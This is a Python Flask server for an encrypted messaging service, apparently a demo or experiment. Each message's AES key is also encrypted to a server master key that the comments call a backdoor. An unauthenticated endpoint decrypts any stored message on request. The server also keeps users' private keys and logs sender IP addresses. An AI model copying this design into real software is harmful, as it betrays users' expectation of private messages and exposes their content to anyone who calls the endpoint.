from flask import Flask, request, jsonify, send_from_directory
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_OAEP, AES
from Crypto.Random import get_random_bytes
from datetime import datetime
import os

app = Flask(__name__)

# Generate RSA key pair
def generate_key_pair():
    key = RSA.generate(2048)
    private_key = key.export_key()
    public_key = key.publickey().export_key()
    return private_key, public_key

# Generate master RSA key pair for the server backdoor access
master_private_key, master_public_key = generate_key_pair()

# Store user keys and messages
user_keys = {}
messages = {}
message_metadata = {}  # Dictionary to store metadata for each message

@app.route('/')
def serve_html():
    return send_from_directory('', 'test.html')  # Ensure test.html is in the same directory as server.py

@app.route('/register', methods=['POST'])
def register():
    username = request.json.get('username')
    if username in user_keys:
        return jsonify({'error': 'Username already registered'}), 400

    private_key, public_key = generate_key_pair()
    user_keys[username] = {
        'private_key': private_key,
        'public_key': public_key
    }
    messages[username] = []
    message_metadata[username] = []  # Initialize metadata list for the user

    print(f"User registered: {username}")  # Output to console
    return jsonify({'public_key': public_key.decode()}), 200

@app.route('/register_client', methods=['POST'])
def register_client():
    username = request.json.get('username')
    public_key = request.json.get('public_key')
    if username in user_keys:
        return jsonify({'error': 'Username already registered'}), 400

    user_keys[username] = {
        'private_key': None,
        'public_key': public_key
    }
    messages[username] = []
    message_metadata[username] = []  # Initialize metadata list for the user

    print(f"User registered: {username}")  # Output to console
    return jsonify({'public_key': public_key.decode()}), 200

@app.route('/send_message', methods=['POST'])
def send_message():
    sender = request.json.get('sender')
    recipient = request.json.get('recipient')
    message = request.json.get('message')

    # Check if both sender and recipient are registered
    if sender not in user_keys or recipient not in user_keys:
        return jsonify({'error': 'Sender or recipient not registered'}), 404

    # Generate an AES session key and initialization vector (IV) for the message
    aes_key = get_random_bytes(32)  # 256-bit AES key
    iv = get_random_bytes(16)  # AES IV

    # Encrypt the message using AES
    cipher_aes = AES.new(aes_key, AES.MODE_CFB, iv)
    encrypted_message = iv + cipher_aes.encrypt(message.encode())

    # Encrypt the AES key with the recipient's RSA public key
    recipient_public_key = user_keys[recipient]['public_key']
    cipher_rsa_recipient = PKCS1_OAEP.new(RSA.import_key(recipient_public_key))
    encrypted_aes_key_for_recipient = cipher_rsa_recipient.encrypt(aes_key)

    # Encrypt the AES key with the server's master RSA public key (for backdoor access)
    cipher_rsa_master = PKCS1_OAEP.new(RSA.import_key(master_public_key))
    encrypted_aes_key_for_server = cipher_rsa_master.encrypt(aes_key)

    # Store the encrypted message and both versions of the AES key
    messages[recipient].append({
        'sender': sender,
        'encrypted_aes_key_for_recipient': encrypted_aes_key_for_recipient.hex(),
        'encrypted_aes_key_for_server': encrypted_aes_key_for_server.hex(),
        'encrypted_message': encrypted_message.hex()
    })

    # Metadata: capture timestamp, message length, IP address, etc.
    metadata = {
        'sender': sender,
        'recipient': recipient,
        'timestamp': datetime.now().isoformat(),
        'message_length': len(encrypted_message),
        'sender_ip': request.remote_addr
    }
    message_metadata[recipient].append(metadata)

    print(f"Message sent from {sender} to {recipient}")  # Debugging output
    return jsonify({'message': 'Message sent successfully'}), 200

'''
@app.route('/get_messages', methods=['POST'])
def get_messages():
    username = request.json.get('username')

    if username not in messages:
        return jsonify({'error': 'User not found'}), 404

    # Retrieve the private key to decrypt the AES key
    user_private_key = RSA.import_key(user_keys[username]['private_key'])
    cipher_rsa_recipient = PKCS1_OAEP.new(user_private_key)

    user_messages = []
    for msg in messages[username]:
        # Decrypt AES key
        encrypted_aes_key = bytes.fromhex(msg['encrypted_aes_key_for_recipient'])
        aes_key = cipher_rsa_recipient.decrypt(encrypted_aes_key)

        # Decrypt the message
        encrypted_message = bytes.fromhex(msg['encrypted_message'])
        iv = encrypted_message[:16]  # Extract the IV
        cipher_aes = AES.new(aes_key, AES.MODE_CFB, iv)
        decrypted_message = cipher_aes.decrypt(encrypted_message[16:]).decode()

        user_messages.append({
            'sender': msg['sender'],
            'decrypted_message': decrypted_message
        })

    return jsonify({
        'messages': user_messages,
        'metadata': message_metadata[username]
    }), 200
'''

@app.route('/get_messages', methods=['POST'])
def get_messages():
    username = request.json.get('username')

    if username not in messages:
        return jsonify({'error': 'User not found'}), 404

    user_messages = []
    for msg in messages[username]:
        # Only include the encrypted message in the response
        user_messages.append({
            'sender': msg['sender'],
            'encrypted_message': msg['encrypted_message']  # Encrypted message in hex format
        })

    return jsonify({
        'messages': user_messages,
        'metadata': message_metadata[username]
    }), 200

# Endpoint for server to access message content with backdoor
@app.route('/server_access_message', methods=['POST'])
def server_access_message():
    recipient = request.json.get('recipient')
    message_index = request.json.get('message_index')  # Index of the message to access

    if recipient not in messages or message_index < 0 or message_index >= len(messages[recipient]):
        return jsonify({'error': 'Message not found'}), 404

    # Decrypt AES key using the server's master private key
    encrypted_aes_key_for_server = bytes.fromhex(messages[recipient][message_index]['encrypted_aes_key_for_server'])
    cipher_rsa_master = PKCS1_OAEP.new(RSA.import_key(master_private_key))
    aes_key = cipher_rsa_master.decrypt(encrypted_aes_key_for_server)

    # Decrypt the message
    encrypted_message = bytes.fromhex(messages[recipient][message_index]['encrypted_message'])
    iv = encrypted_message[:16]  # Extract the IV
    cipher_aes = AES.new(aes_key, AES.MODE_CFB, iv)
    decrypted_message = cipher_aes.decrypt(encrypted_message[16:]).decode()

    return jsonify({
        'sender': messages[recipient][message_index]['sender'],
        'decrypted_message': decrypted_message
    }), 200

if __name__ == '__main__':
    app.run(ssl_context='adhoc')
    #app.run(host='0.0.0.0', port=5000)